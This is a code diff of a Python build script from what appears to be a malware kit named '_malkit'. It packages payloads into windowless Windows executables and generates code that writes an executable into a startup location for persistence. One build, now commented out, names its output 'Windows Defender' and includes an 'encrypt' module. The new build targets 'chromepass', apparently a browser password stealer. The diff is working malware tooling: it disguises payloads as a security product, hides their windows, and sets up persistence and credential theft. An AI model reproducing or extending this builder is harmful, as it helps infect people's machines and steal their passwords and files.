@@ -10,6 +10,9 @@ import time
 
 def exebuild(target, include, output, icon="icon.ico"):
     try:
+        includes = []
+        if len(include) > 0:
+            includes = [f'{include}']
         sys.argv.append("pexe37")
         setup(
             options={
@@ -17,27 +20,22 @@ def exebuild(target, include, output, icon="icon.ico"):
                     "bundle_files": 1,
                     "optimize": 2,
                     "excludes": [
-                        "pyreadline",
+                        "doctest",
                         "pdb",
                         "unittest",
-                        "inspect"
+                        "inspect",
                         "difflib",
-                        "doctest",
-                        "pickle",
-                        "tarfile",
-                        "typing",
-                        "locale",
 
-                        "_lzma"
+
                     ],
 
-                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll", "tcl85.dll", "tk85.dll"],
-                    "includes": [f'{include}']
+                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll", "tcl85.dll", "tk85.dll", "libcrypto-1_1-x64.dll"],
+                    "includes": includes
                 },
 
             },
             zipfile=None,
-            console=[{
+            windows=[{
                 "script": target,
                 "icon_resources": [(1, icon)]
             }]
@@ -79,7 +77,7 @@ def gendie(filenames: list):
     return 0
 
 
-def generate_payload(filename, destname, startup, icon="icon.ico"):
+def generate_payload(filename, destname, startup, icon="icons/icon.ico", modulename="_malkit"):
     payload = get_payload(filename)
     exepayload = exe_bytes(startup)
     start_str = "startups='" + str(startup) + "'\n"
@@ -98,9 +96,10 @@ def generate_payload(filename, destname, startup, icon="icon.ico"):
     pyline += "    f.write(payload)\n"
     pyline += f"with open(STARTUP, 'wb') as f:\n"
     pyline += "    f.write(exepayload)"
-    with open(f"{destname}.py", "wb") as f:
+    print(len(pyline))
+    with open(f"_malkit/{destname}.py", "wb") as f:
         f.write(pyline.encode())
-    return f"{destname}"
+    return f"{modulename}"
 
 
 def exe_bytes(filename: str):
@@ -112,5 +111,7 @@ def exe_bytes(filename: str):
 
 
 if __name__ == "__main__":
-    exebuild(target="stub.py", include='darkarp.malkit_modules.encrypt',
-             output='Windows Defender', icon="icon2.ico")
+    # exebuild(target="stub.py", include='darkarp.malkit_modules.encrypt',
+    #          output='Windows Defender', icon="icons/icon2.ico")
+    exebuild(target="chromepass.py", include='',
+             output="chromepass", icon="icons/icon2.ico")
